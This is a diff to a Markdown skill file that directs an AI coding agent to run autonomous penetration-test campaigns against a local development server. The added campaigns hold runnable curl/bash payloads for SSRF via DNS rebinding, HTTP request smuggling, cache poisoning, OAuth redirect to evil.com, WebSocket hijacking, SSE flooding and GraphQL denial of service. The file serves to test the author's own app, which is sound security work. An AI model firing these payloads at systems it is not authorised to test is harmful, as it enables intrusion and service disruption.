@@ -11,6 +11,8 @@ Unlike `/sec-ship` which reads code for patterns, `/redteam` sends actual attack
 
 **FIRE AND FORGET** — Execute autonomously. Attack everything. Fix confirmed vulns. Verify fixes.
 
+> **⚡ CONTEXT WARNING:** This skill is ~31K tokens. For best results, invoke `/redteam` at the start of a fresh conversation — not deep into an existing session. If invoked mid-conversation, the orchestrator compensates by delegating ALL heavy work to sub-agents (which start with clean context) and keeping its own footprint minimal.
+
 ---
 
 ## Execution Rules (CRITICAL)
@@ -33,11 +35,131 @@ Unlike `/sec-ship` which reads code for patterns, `/redteam` sends actual attack
 This skill follows the **[Context Management Protocol](~/.claude/standards/CONTEXT_MANAGEMENT.md)**.
 
 Key rules for this skill:
-- Campaign agents (auth bypass, injection, IDOR, etc.) return < 500 tokens each (full PoC details written to `.redteam-reports/`)
-- State file `.redteam-reports/state-YYYYMMDD-HHMMSS.json` tracks which campaigns and fixes are complete
+- **Campaign agents return < 500 tokens to orchestrator** — full PoC details (curl commands, response bodies, evidence) written to `.redteam-reports/evidence/campaign-XX.md`
+- State file `.redteam-reports/state-YYYYMMDD-HHMMSS.json` tracks which campaigns, fixes, and agent batches are complete
 - Resume from checkpoint if context resets — skip completed campaigns, resume from next attack vector
-- Campaigns run sequentially (each builds on recon from prior); fix agents also sequential (they modify code)
-- Orchestrator messages stay lean: "Campaign 5/12: Injection — 1 CONFIRMED (RT-007), 3 NOT VULNERABLE"
+- **Orchestrator NEVER runs curl commands directly** — delegates all attack work to campaign agents
+- **Orchestrator NEVER reads evidence files into context** — only reads the < 500 token summary returned by each agent
+- Orchestrator messages stay lean: "Batch 2/6: Campaigns 5-8 — 2 CONFIRMED (RT-007, RT-011), 7 NOT VULNERABLE"
+- Fix agents run sequentially (they modify code)
+- **Context budget tracking:** Orchestrator checkpoints to state file after every batch. If estimated context > 60% consumed, write full state to disk before continuing.
+- **Orchestrator stays THIN:** Phase 0 (pre-flight) and report initialization are the ONLY phases the orchestrator performs directly. Everything else — recon, campaigns, fixes, report synthesis — is delegated to sub-agents. The orchestrator's loop is: dispatch batch → collect summary → update report → dispatch next batch. Nothing more.
+
+### Evidence File Pattern
+
+Each campaign agent writes its full evidence to disk:
+
+```
+.redteam-reports/
+├── redteam-YYYYMMDD-HHMMSS.md      # Main report (living document)
+├── state-YYYYMMDD-HHMMSS.json      # Checkpoint state
+└── evidence/
+    ├── recon.md                      # Phase 1 attack surface map
+    ├── campaign-01-auth-bypass.md    # Full curl commands + responses
+    ├── campaign-02-header-inject.md
+    ├── campaign-11-idor-auth.md
+    ├── ...
+    └── campaign-34-attack-chain.md
+```
+
+### What Goes in Evidence Files (NOT in orchestrator context)
+
+- Full curl commands with headers and bodies
+- Complete HTTP response bodies
+- Screenshots or DOM snapshots (if Playwright used)
+- Step-by-step attack reproduction instructions
+- Response timing data
+
+### What Goes Back to Orchestrator (< 500 tokens per agent)
+
+```
+Campaign 11: IDOR — Cross-User Data Access
+  Attacks: 6 attempted
+  CONFIRMED: 2
+    RT-011: GET /api/content/[victim-id] returns 200 (IDOR read) — severity: HIGH
+    RT-012: PATCH /api/content/[victim-id] returns 200 (IDOR write) — severity: CRITICAL
+  NOT VULNERABLE: 4
+  Evidence: .redteam-reports/evidence/campaign-11-idor-auth.md
+```
+
+---
+
+## AGENT ORCHESTRATION
+
+This skill follows the **[Agent Orchestration Protocol](~/.claude/standards/AGENT_ORCHESTRATION.md)**.
+
+The orchestrator coordinates campaign agents but **NEVER sends curl commands directly**. All attack work is delegated to focused agents that write evidence to disk and return lean summaries.
+
+### Model Selection for This Skill
+
+| Agent Type | Model | Why |
+|-----------|-------|-----|
+| Reconnaissance agent (Phase 1) | `sonnet` | Must understand code structure, auth patterns, and map attack surface from source |
+| Unauthenticated campaign agents (Phase 2) | `sonnet` | Must craft attack payloads and interpret HTTP responses intelligently |
+| Test user provisioning (Phase 3.0) | `haiku` | Mechanical API calls — create users, sign in, seed data |
+| Authenticated campaign agents (Phase 3) | `sonnet` | Must understand business logic, IDOR patterns, and cross-tenant boundaries |
+| OAuth/OIDC campaign (Campaign 28) | `opus` | Complex multi-step auth flow attacks requiring deep protocol understanding |
+| Browser DOM campaign (Campaign 29) | `sonnet` | Must drive Playwright MCP and interpret DOM state |
+| Attack chain synthesis (Campaign 34) | `opus` | Must cross-reference ALL findings and reason about multi-step exploit chains |
+| Test user cleanup (Phase 3.11) | `haiku` | Mechanical API calls — delete users, verify cleanup |
+| Fix agents (Phase 4) | `sonnet` | Must write correct security fixes without breaking functionality |
+| Report synthesizer (Phase 5) | `sonnet` | Must produce professional pentest report narrative |
+
+### Campaign Batching
+
+Campaigns are grouped into **agent batches** based on dependency chains and localhost server load. Each batch runs as one sub-agent.
+
+**Phase 2 — Unauthenticated (3 batches, max 2 parallel):**
+
+| Batch | Campaigns | Why Grouped | Parallel? |
+|-------|-----------|-------------|-----------|
+| Batch U1 | 1 (Auth Bypass), 2 (Header Injection), 3 (CORS), 4 (Method Tampering) | All test perimeter defenses — independent of each other | Yes (with U2) |
+| Batch U2 | 5 (Injection), 6 (Path Traversal), 7 (Error Disclosure), 8 (Rate Limiting) | All test input handling — independent of each other | Yes (with U1) |
+| Batch U3 | 9 (Scraping Abuse), 10 (File Upload), 23 (DNS Rebinding), 24 (HTTP Smuggling), 25 (Cache Poisoning), 26 (GraphQL), 27 (SSE) | Advanced attacks — some need recon from U1/U2 results | After U1+U2 |
+
+**Phase 3 — Authenticated (4 batches, max 2 parallel):**
+
+| Batch | Campaigns | Why Grouped | Parallel? |
+|-------|-----------|-------------|-----------|
+| Batch A1 | 11 (IDOR), 12 (Stored XSS), 13 (Business Logic), 14 (Race Conditions) | Core authenticated attacks — each independent | Yes (with A2) |
+| Batch A2 | 15 (RLS Bypass), 16 (Privilege Escalation), 17 (Prompt Injection), 18 (Webhook Forgery) | Security boundary attacks — independent | Yes (with A1) |
+| Batch A3 | 19 (Mass Assignment), 20 (Account Takeover), 28 (OAuth), 29 (Browser DOM), 30 (Webhook Storm), 31 (WebSocket) | Complex attacks — some need IDs from A1/A2 | After A1+A2 |
+| Batch A4 | 32 (API Fuzzing), 33 (Second-Order), 34 (Attack Chain Synthesis) | Meta-attacks — MUST run last because they build on ALL prior findings | After A3 |
+
+### Parallelization Rules
+
+1. **Max 2 campaign agents running simultaneously** — more overwhelms the dev server with concurrent requests
+2. **Max 1 fix agent at a time** — fix agents modify code, must be sequential
+3. **Phase 3.0 (test user setup) must complete before ANY Phase 3 batch starts** — all authenticated batches need tokens
+4. **Phase 3.11 (cleanup) waits for ALL Phase 3 batches** — never clean up while campaigns are still running
+5. **Batch A4 always runs LAST** — Campaign 34 (Attack Chain Synthesis) needs findings from ALL other campaigns
+
+### What Each Campaign Agent Receives
+
+**Unauthenticated agent context:**
+```
+- DEV_PORT (localhost port)
+- Attack surface map (from Phase 1 recon)
+- Campaign instructions (the specific attacks to run)
+- Evidence file path to write to
+```
+
+**Authenticated agent context:**
+```
+- DEV_PORT (localhost port)
+- Attack surface map (from Phase 1 recon)
+- TOKEN_A, TOKEN_B (auth tokens for attacker/victim)
+- USER_A_ID, USER_B_ID (user IDs)
+- VICTIM_RESOURCE_IDS (resource IDs seeded in Phase 3.0)
+- Campaign instructions
+- Evidence file path to write to
+```
+
+**Attack Chain agent (Campaign 34) additional context:**
+```
+- All CONFIRMED finding IDs and their one-line summaries from prior batches
+- (Does NOT get full evidence files — reads them from disk if needed)
+```
 
 ---
 
@@ -400,16 +522,33 @@ Update the report file's `## Attack Surface` section with discovered data:
 
 Run ALL perimeter campaigns WITHOUT authentication. These test the locks on the front door.
 
+### Agent Batching (Phase 2)
+
+Campaigns are split into 3 agent batches per the AGENT ORCHESTRATION section above:
+
+- **Batch U1** (Campaigns 1-4): Perimeter defenses — runs in parallel with U2
+- **Batch U2** (Campaigns 5-8): Input handling — runs in parallel with U1
+- **Batch U3** (Campaigns 9-10, 23-27): Advanced attacks — runs after U1+U2 complete
+
+Each batch agent receives: `DEV_PORT`, attack surface map from Phase 1, and its campaign instructions. Each agent writes evidence to `.redteam-reports/evidence/campaign-XX-name.md` and returns a < 500 token summary to the orchestrator.
+
+**Orchestrator responsibilities between batches:**
+1. Collect summaries from completed batch agents
+2. Update `## Findings` table with new rows
+3. Update `## Progress Log` with batch results
+4. Pass any CONFIRMED finding IDs to subsequent batches (for cross-reference)
+5. **Write report to disk** — checkpoint between batches
+
 For each attack, record:
 - **The exact curl command** (reproducible PoC)
 - **The response** (status code + relevant body)
 - **Verdict:** CONFIRMED (exploitable) or NOT VULNERABLE (defense held)
 
-**AFTER EACH CAMPAIGN completes:**
+**AFTER EACH BATCH completes (orchestrator updates report):**
 1. Add all findings to `## Findings` table (new rows with RT-XXX IDs)
 2. Add PoC details for any CONFIRMED findings to `## Proof of Concept Details`
-3. Append to `## Progress Log`: `| [HH:MM] | Campaign N | [Name] | [X] CONFIRMED |`
-4. Update `**Status:**` to `🔴 IN PROGRESS — Campaign [N+1]: [next name]`
+3. Append to `## Progress Log`: `| [HH:MM] | Batch U[N] | Campaigns X-Y | [Z] CONFIRMED |`
+4. Update `**Status:**` to `🔴 IN PROGRESS — Batch U[N+1]`
 5. **Write the file to disk** — this is the checkpoint that survives restart
 
 ### Campaign 1: Authentication Bypass
@@ -1271,11 +1410,265 @@ fi
 
 ---
 
+### Campaign 23: DNS Rebinding SSRF Bypass
+
+**Objective:** Bypass URL validation filters using DNS rebinding — domain resolves to public IP during validation, then to `127.0.0.1` on the actual fetch.
+
+**Only if SSRF-susceptible endpoints exist** (URL inputs, link previews, webhooks, scraping/fetch endpoints).
+
+```bash
+# Test with known DNS rebinding services
+REBINDING_PAYLOADS=(
+  "http://localtest.me"                           # Always resolves to 127.0.0.1
+  "http://spoofed.burpcollaborator.net"           # Configurable DNS
+  "http://1.0.0.127.nip.io"                       # nip.io resolves to embedded IP
+  "http://127.0.0.1.nip.io"                       # Direct nip.io loopback
+  "http://www.oastify.com"                         # Burp collaborator alternative
+  "http://0177.0.0.1"                              # Octal IP notation for 127.0.0.1
+  "http://2130706433"                              # Decimal IP for 127.0.0.1
+  "http://127.1"                                   # Shortened loopback
+  "http://[::ffff:127.0.0.1]"                     # IPv6-mapped IPv4
+)
+
+# For each URL-accepting endpoint found during recon
+for endpoint in $URL_ACCEPTING_ENDPOINTS; do
+  for payload in "${REBINDING_PAYLOADS[@]}"; do
+    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "http://localhost:$PORT$endpoint" \
+      -H "Content-Type: application/json" \
+      -d "{\"url\": \"$payload\"}" --max-time 10)
+    STATUS=$(echo "$RESPONSE" | tail -1)
+    if [ "$STATUS" = "200" ]; then
+      echo "CONFIRMED: DNS rebinding bypass on $endpoint with $payload"
+    fi
+  done
+done
+```
+
+**Expected:** All rebinding payloads blocked by URL validation (check against resolved IP, not just hostname)
+**CONFIRMED if:** Internal content returned through a rebinding payload that bypassed hostname-based SSRF filters
+
+---
+
+### Campaign 24: HTTP Request Smuggling
+
+**Objective:** Exploit discrepancies between how the app and its reverse proxy (Vercel edge, Nginx, etc.) parse `Transfer-Encoding` and `Content-Length` headers.
+
+```bash
+# CL.TE — Content-Length trusted by frontend, Transfer-Encoding by backend
+curl -s -X POST "http://localhost:$PORT/api/tasks" \
+  -H "Content-Length: 6" \
+  -H "Transfer-Encoding: chunked" \
+  -d $'0\r\n\r\nGPOST / HTTP/1.1\r\nHost: localhost\r\n\r\n' \
+  --max-time 5
+
+# TE.CL — Transfer-Encoding trusted by frontend, Content-Length by backend
+curl -s -X POST "http://localhost:$PORT/api/tasks" \
+  -H "Transfer-Encoding: chunked" \
+  -H "Content-Length: 3" \
+  -d $'8\r\nSMUGGLED\r\n0\r\n\r\n' \
+  --max-time 5
+
+# TE.TE — Obfuscated Transfer-Encoding to confuse one layer
+OBFUSCATED_TE=(
+  "Transfer-Encoding: xchunked"
+  "Transfer-Encoding : chunked"
+  "Transfer-Encoding: chunked"$'\r\n'"Transfer-Encoding: x"
+  "Transfer-Encoding:${IFS}chunked"
+  "X: ignored\r\nTransfer-Encoding: chunked"
+)
+
+for header in "${OBFUSCATED_TE[@]}"; do
+  curl -s -X POST "http://localhost:$PORT/api/tasks" \
+    -H "$header" \
+    -d $'0\r\n\r\n' --max-time 5
+done
+
+# H2C Smuggling — upgrade HTTP/1.1 to HTTP/2 cleartext through proxy
+curl -s -X GET "http://localhost:$PORT/" \
+  -H "Upgrade: h2c" \
+  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
+  -H "Connection: Upgrade, HTTP2-Settings"
+```
+
+**Expected:** Server rejects or ignores conflicting headers; no second request smuggled
+**CONFIRMED if:** Second (smuggled) request is processed, or response includes content from a different request. Also confirmed if H2C upgrade succeeds and bypasses access controls.
+
+---
+
+### Campaign 25: Web Cache Poisoning
+
+**Objective:** Inject unkeyed headers that alter the response, which then gets cached and served to other users.
+
+```bash
+# Test unkeyed header reflection — these headers may alter response without being part of the cache key
+POISON_HEADERS=(
+  "X-Forwarded-Host: evil.com"
+  "X-Forwarded-Scheme: nothttps"
+  "X-Original-URL: /admin"
+  "X-Rewrite-URL: /admin"
+  "X-Forwarded-Proto: nothttps"
+  "X-Host: evil.com"
+  "X-Forwarded-Server: evil.com"
+  "X-HTTP-Method-Override: POST"
+)
+
+for header in "${POISON_HEADERS[@]}"; do
+  # Send request with poison header
+  RESPONSE=$(curl -s -D - "http://localhost:$PORT/" -H "$header")
+
+  # Check if the header value appears in the response (reflected)
+  KEY=$(echo "$header" | cut -d: -f1)
+  VALUE=$(echo "$header" | cut -d: -f2- | tr -d ' ')
+  if echo "$RESPONSE" | grep -qi "$VALUE"; then
+    echo "REFLECTED: $KEY value appears in response — potential cache poison vector"
+  fi
+
+  # Check cache headers to see if response is cacheable
+  echo "$RESPONSE" | grep -i "cache-control\|x-cache\|cf-cache\|age:\|x-vercel-cache"
+done
+
+# Verify cache key behavior — send identical request twice, second should be cached
+FIRST=$(curl -s -D - "http://localhost:$PORT/" -H "X-Forwarded-Host: evil.com" | grep -i "x-cache\|x-vercel-cache\|cf-cache")
+sleep 1
+SECOND=$(curl -s -D - "http://localhost:$PORT/" | grep -i "x-cache\|x-vercel-cache\|cf-cache")
+echo "First (poisoned): $FIRST"
+echo "Second (clean): $SECOND"
+```
+
+**Expected:** Unkeyed headers do not alter response content; cache headers show proper Vary
+**CONFIRMED if:** Header value reflected in cacheable response — other users would receive the poisoned content
+
+---
+
+### Campaign 26: GraphQL Live Exploitation (if detected)
+
+**Only if GraphQL endpoint exists.** Detect during recon (look for `/graphql`, `/api/graphql`, or any endpoint returning `{"data":` format).
+
+```bash
+# Detect GraphQL endpoint
+GQL_ENDPOINTS=("/graphql" "/api/graphql" "/api/v1/graphql" "/gql")
+GQL_ENDPOINT=""
+for ep in "${GQL_ENDPOINTS[@]}"; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://localhost:$PORT$ep" \
+    -H "Content-Type: application/json" -d '{"query":"{ __typename }"}')
+  if [ "$STATUS" = "200" ]; then
+    GQL_ENDPOINT="$ep"
+    break
+  fi
+done
+
+if [ -z "$GQL_ENDPOINT" ]; then
+  echo "No GraphQL endpoint detected — skipping"
+else
+  # 26.1 Introspection (should be disabled in production)
+  curl -s -X POST "http://localhost:$PORT$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __schema { types { name fields { name } } } }"}'
+
+  # 26.2 Depth bomb — deeply nested query
+  DEPTH_QUERY="{ user { posts { comments { user { posts { comments { user { posts { comments { user { id } } } } } } } } } } }"
+  curl -s -X POST "http://localhost:$PORT$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"$DEPTH_QUERY\"}" --max-time 10
+
+  # 26.3 Batched queries — send array of queries
+  curl -s -X POST "http://localhost:$PORT$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
+
+  # 26.4 Alias-based DoS — same expensive query with 100 aliases
+  ALIAS_QUERY="{"
+  for i in $(seq 1 100); do
+    ALIAS_QUERY="${ALIAS_QUERY} a${i}: __typename"
+  done
+  ALIAS_QUERY="${ALIAS_QUERY} }"
+  curl -s -X POST "http://localhost:$PORT$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"$ALIAS_QUERY\"}" --max-time 10
+
+  # 26.5 Field suggestion enumeration
+  curl -s -X POST "http://localhost:$PORT$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ usr }"}'  # Intentional typo — check if error suggests "user"
+fi
+```
+
+**Expected:** Introspection disabled, depth/batch/alias limits enforced, no field suggestions
+**CONFIRMED if:** Full schema returned via introspection, deep/batched queries succeed without limits, or field names leaked via suggestions
+
+---
+
+### Campaign 27: SSE/Streaming Endpoint Attacks (if detected)
+
+**Only if Server-Sent Events or streaming endpoints exist.** Common with AI chat endpoints that use `text/event-stream` or `ReadableStream`.
+
+```bash
+# Detect SSE endpoints — look for text/event-stream in response headers
+SSE_ENDPOINTS=()
+for route in $DISCOVERED_ROUTES; do
+  CONTENT_TYPE=$(curl -s -D - -o /dev/null "http://localhost:$PORT$route" 2>/dev/null | grep -i "content-type:" | grep -i "event-stream\|text/event-stream")
+  if [ -n "$CONTENT_TYPE" ]; then
+    SSE_ENDPOINTS+=("$route")
+  fi
+done
+
+# Also check code for streaming patterns
+grep -rn "text/event-stream\|ReadableStream\|TransformStream\|new Response.*stream" --include="*.ts" --include="*.tsx" app/api/ 2>/dev/null
+
+for sse_ep in "${SSE_ENDPOINTS[@]}"; do
+  # 27.1 SSE without auth — should get 401
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT$sse_ep" \
+    -H "Accept: text/event-stream" --max-time 5)
+  echo "SSE $sse_ep without auth: $STATUS"
+
+  # 27.2 Event injection — if endpoint accepts input, try injecting SSE event format
+  curl -s -X POST "http://localhost:$PORT$sse_ep" \
+    -H "Content-Type: application/json" \
+    -d '{"message":"test\n\nevent: injected\ndata: {\"malicious\":true}\n\n"}' \
+    --max-time 5
+
+  # 27.3 Connection flooding — open multiple simultaneous SSE connections
+  for i in $(seq 1 20); do
+    curl -s -N "http://localhost:$PORT$sse_ep" \
+      -H "Accept: text/event-stream" --max-time 2 > /dev/null 2>&1 &
+  done
+  sleep 3
+  # Check if server still responds
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/" --max-time 5)
+  echo "Server health after 20 SSE connections: $STATUS"
+  kill $(jobs -p) 2>/dev/null
+  wait 2>/dev/null
+done
+```
+
+**Expected:** Auth required for SSE, no event injection possible, server handles connection flooding gracefully
+**CONFIRMED if:** SSE data received without auth, injected events appear in stream, or server becomes unresponsive under connection load
+
+---
+
 ## Phase 3: Authenticated Attack Campaigns (Internal Testing)
 
 The perimeter is tested. Now get INSIDE the house and test what authenticated users can break. This is where most real-world vulnerabilities hide in well-secured apps.
 
-**AFTER EACH CAMPAIGN completes:** Same reporting rules as Phase 2 — update findings table, add PoCs, append Progress Log, write to disk.
+### Agent Batching (Phase 3)
+
+Campaigns are split into 4 agent batches per the AGENT ORCHESTRATION section above:
+
+- **Phase 3.0** (orchestrator or haiku agent): Test user provisioning — MUST complete before any batch
+- **Batch A1** (Campaigns 11-14): Core authenticated attacks — runs in parallel with A2
+- **Batch A2** (Campaigns 15-18): Security boundary attacks — runs in parallel with A1
+- **Batch A3** (Campaigns 19-20, 28-31): Complex attacks — runs after A1+A2 complete
+- **Batch A4** (Campaigns 32-34): Meta-attacks — runs LAST (needs ALL prior findings)
+- **Phase 3.11** (orchestrator or haiku agent): Test user cleanup — runs after ALL batches
+
+Each batch agent receives: `DEV_PORT`, attack surface map, `TOKEN_A`, `TOKEN_B`, `USER_A_ID`, `USER_B_ID`, `VICTIM_RESOURCE_IDS`, and its campaign instructions. Each agent writes evidence to disk and returns < 500 token summary.
+
+**Critical dependency chain:**
+```
+Phase 3.0 (setup) → Batch A1 + A2 (parallel) → Batch A3 → Batch A4 → Phase 3.11 (cleanup)
+```
+
+**AFTER EACH BATCH completes (orchestrator updates report):** Same rules as Phase 2 — update findings table, add PoCs, append Progress Log, write to disk.
 
 ### 3.0 Test User Provisioning
 
@@ -1953,6 +2346,368 @@ curl -s -X POST "http://localhost:$DEV_PORT/api/webhooks/stripe" \
 
 ---
 
+### Campaign 28: OAuth/OIDC Flow Attacks (Authenticated)
+
+**Objective:** Exploit OAuth/OpenID Connect flows used for authentication. Detect OAuth provider during recon (Supabase Auth, Auth0, Clerk, NextAuth, etc.).
+
+**Discovery:** Check for OAuth endpoints and configuration:
+```bash
+# Detect OAuth setup
+grep -rn "GOOGLE_CLIENT\|GITHUB_CLIENT\|OAUTH\|openid\|oauth\|auth/callback\|signInWith" --include="*.ts" --include="*.tsx" app/ lib/ .env.example 2>/dev/null | grep -v node_modules
+# Find callback URLs
+grep -rn "callback\|redirect_uri\|redirectTo" --include="*.ts" app/api/auth/ lib/ 2>/dev/null
+```
+
+**Attacks:**
+
+| # | Attack | How |
+|---|--------|-----|
+| 28.1 | Redirect URI manipulation | Modify callback URL to attacker domain |
+| 28.2 | Open redirect chain | Use app's open redirect as OAuth callback |
+| 28.3 | State parameter CSRF | Initiate OAuth without `state` param |
+| 28.4 | Authorization code replay | Use same auth code twice |
+| 28.5 | PKCE downgrade | Strip `code_verifier` from token exchange |
+| 28.6 | Token substitution | Swap provider token between accounts |
+| 28.7 | Callback race | Two simultaneous OAuth callbacks |
+
+```bash
+# 28.1 Redirect URI manipulation — try modifying the callback URL
+# Find the OAuth initiation endpoint
+OAUTH_START=$(grep -rn "signInWith\|authorize\|oauth/authorize" --include="*.ts" app/ lib/ 2>/dev/null | head -1)
+echo "OAuth entry point: $OAUTH_START"
+
+# Test if callback URL is validated — try external redirect
+curl -s -D - "http://localhost:$DEV_PORT/api/auth/callback?redirect_to=https://evil.com" 2>/dev/null | grep -i "location:"
+curl -s -D - "http://localhost:$DEV_PORT/api/auth/callback?next=//evil.com" 2>/dev/null | grep -i "location:"
+curl -s -D - "http://localhost:$DEV_PORT/api/auth/callback?redirectTo=https://evil.com/steal" 2>/dev/null | grep -i "location:"
+
+# 28.3 State parameter — check if OAuth flow uses state param
+# Code review: does the OAuth callback verify state matches what was sent?
+grep -rn "state\|csrf\|nonce" --include="*.ts" app/api/auth/ 2>/dev/null
+
+# 28.5 PKCE — check if code_verifier is required
+# Code review: does token exchange require code_verifier?
+grep -rn "code_verifier\|code_challenge\|pkce\|PKCE" --include="*.ts" app/ lib/ 2>/dev/null
+
+# 28.7 Callback race — two simultaneous callbacks with same code
+AUTH_CODE="test_code_value"
+curl -s "http://localhost:$DEV_PORT/api/auth/callback?code=$AUTH_CODE" &
+curl -s "http://localhost:$DEV_PORT/api/auth/callback?code=$AUTH_CODE" &
+wait
+```
+
+**Expected:** Callback URL strictly validated (same-origin only), state param verified, PKCE enforced, code single-use
+**CONFIRMED if:** External redirect succeeds via callback, state param missing/ignored, code reusable, or PKCE not enforced
+
+---
+
+### Campaign 29: Browser-Based DOM Testing (via Playwright)
+
+**Objective:** Test attacks that require a real browser — DOM XSS execution, clickjacking, postMessage, CSRF with cookies. Curl cannot test these.
+
+**Requires:** Playwright MCP available. If not available, fall back to code review only.
+
+**Discovery-based:** Uses stored payloads from Campaign 13 (Stored XSS) and resource IDs from Phase 3.0.
+
+```bash
+# Check if Playwright is available (skip gracefully if not)
+# This campaign uses browser automation — not curl
+
+# 29.1 Stored XSS Execution Proof
+# Navigate to page that renders user-created content
+# Check if previously stored XSS payloads execute in the browser
+# Evidence: dialog detected, console error, or DOM mutation
+
+# 29.2 Clickjacking Proof
+# Create an HTML page with the app in an iframe
+# If X-Frame-Options and CSP frame-ancestors are missing, iframe loads = confirmed
+
+# 29.3 postMessage Origin Validation
+# Open app in one tab, send postMessage from attacker origin
+# Check if app processes message without validating origin
+
+# 29.4 CSRF with Cookies
+# Navigate to attacker page that auto-submits form to app's state-changing endpoint
+# Check if request succeeds using browser's existing cookies (no CSRF token needed)
+
+# 29.5 DOM Clobbering
+# Create content with HTML that overwrites DOM globals
+# Navigate to page and check if globals are clobbered
+```
+
+**Implementation Notes:**
+- Use Playwright MCP's `browser_navigate`, `browser_evaluate`, `browser_snapshot` tools
+- For clickjacking: create temp HTML file with `<iframe src="http://localhost:$PORT">`, navigate to it, check if iframe loads
+- For XSS: navigate to pages rendering user content, use `browser_evaluate` to check for injected script execution
+- For postMessage: use `browser_evaluate` to send `window.postMessage({malicious:true}, '*')` and check app behavior
+- If Playwright unavailable: report all as `NOT TESTED (no browser automation)` — do NOT skip the code review
+
+**Expected:** XSS payloads sanitized (no execution), iframe blocked, postMessage origin checked, CSRF tokens present
+**CONFIRMED if:** Alert dialog fires, iframe loads app content, postMessage processed from any origin, or form submitted without CSRF token
+
+---
+
+### Campaign 30: Concurrent Payment Webhook Storm (Authenticated)
+
+**Objective:** Send the same payment webhook event 10 times simultaneously. Test for double tier upgrades, duplicate emails, customer ID race conditions.
+
+**Discovery:** Find webhook endpoints during recon:
+```bash
+# Detect payment webhook endpoints
+grep -rn "webhook\|Webhook" --include="*.ts" app/api/ 2>/dev/null | grep -v node_modules
+WEBHOOK_ENDPOINTS=$(grep -rl "webhook" app/api/ --include="*.ts" 2>/dev/null | sed 's|app/api||;s|/route.ts||;s|^|/api|')
+```
+
+```bash
+# Create a realistic-looking webhook payload based on detected provider
+# Adapt payload to match the provider found (Polar, Stripe, Lemon Squeezy, etc.)
+
+# Generic webhook storm — same event ID sent 10 times
+WEBHOOK_EVENT_ID="evt_storm_test_$(date +%s)"
+WEBHOOK_PAYLOAD='{"id":"'$WEBHOOK_EVENT_ID'","type":"subscription.created","data":{"object":{"id":"sub_test","customer":"cus_test","status":"active"}}}'
+
+# Find the first webhook endpoint
+WEBHOOK_EP=$(echo "$WEBHOOK_ENDPOINTS" | head -1)
+
+if [ -n "$WEBHOOK_EP" ]; then
+  echo "Testing webhook storm on $WEBHOOK_EP with event $WEBHOOK_EVENT_ID"
+
+  # Send 10 identical webhook events simultaneously
+  for i in $(seq 1 10); do
+    curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
+      -X POST "http://localhost:$DEV_PORT$WEBHOOK_EP" \
+      -H "Content-Type: application/json" \
+      -d "$WEBHOOK_PAYLOAD" &
+  done
+  wait
+
+  echo "Check: Was the event processed exactly once? Or 10 times?"
+  echo "Evidence: Check DB for duplicate entries, duplicate emails sent, duplicate tier changes"
+else
+  echo "No webhook endpoints found — skipping"
+fi
+```
+
+**Expected:** Event processed exactly once (idempotency), duplicates rejected with 200 (not 4xx — avoid retry storm)
+**CONFIRMED if:** Multiple processing of same event (duplicate DB entries, duplicate emails, tier changed multiple times)
+
+---
+
+### Campaign 31: WebSocket Live Exploitation (if detected)
+
+**Objective:** Test WebSocket security — auth, message injection, flooding, cross-origin hijacking.
+
+**Discovery:**
+```bash
+# Detect WebSocket endpoints
+grep -rn "WebSocket\|wss://\|ws://\|socket\.io\|useWebSocket\|upgrade.*websocket" --include="*.ts" --include="*.tsx" app/ lib/ 2>/dev/null | grep -v node_modules
+WS_ENDPOINTS=$(grep -rn "new WebSocket\|wss://\|ws://" --include="*.ts" --include="*.tsx" app/ lib/ components/ 2>/dev/null | grep -oE "ws[s]?://[^'\"]*" | sort -u)
+```
+
+If WebSocket endpoints detected:
+
+```bash
+# 31.1 Connect without auth
+# Use websocat, wscat, or curl with upgrade header
+curl -s -i -N \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: dGVzdA==" \
+  "http://localhost:$DEV_PORT/ws" --max-time 5
+
+# 31.2 Cross-Site WebSocket Hijacking (CSWSH)
+# Connect with evil Origin header
+curl -s -i -N \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: dGVzdA==" \
+  -H "Origin: https://evil-site.com" \
+  "http://localhost:$DEV_PORT/ws" --max-time 5
+
+# 31.3 Code review supplement for WebSocket
+# Check if WS connection validates auth token on connect AND on each message
+grep -rn "onConnect\|onMessage\|authenticate\|verifyToken" --include="*.ts" app/api/**/ws* lib/*socket* 2>/dev/null
+```
+
+**Expected:** Auth required on connect, origin validated, message rate limited, token checked per-message
+**CONFIRMED if:** WS connected without auth, evil origin accepted, message flooding possible, or token not validated
+
+---
+
+### Campaign 32: API Fuzzing with Randomized Inputs (Authenticated)
+
+**Objective:** After predetermined payload campaigns, run randomized fuzzing to find edge cases that static payload lists miss. Target the top 5 most complex endpoints discovered during recon.
+
+```bash
+# Select top 5 endpoints (prefer ones that accept JSON bodies with multiple fields)
+# Identified during Phase 1 recon — pick endpoints with most parameters
+
+# Fuzzing function — generates random inputs
+generate_fuzz() {
+  local TYPE=$((RANDOM % 10))
+  case $TYPE in
+    0) python3 -c "import os; print(os.urandom(64).hex())" ;;                    # Random hex
+    1) python3 -c "print('A' * $((RANDOM % 100000 + 1)))" ;;                     # Long string
+    2) python3 -c "print(chr(0) * 100)" ;;                                        # Null bytes
+    3) echo '{"a":{"b":{"c":{"d":{"e":"deep"}}}}}' ;;                            # Nested object
+    4) echo '[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]' ;;           # Array
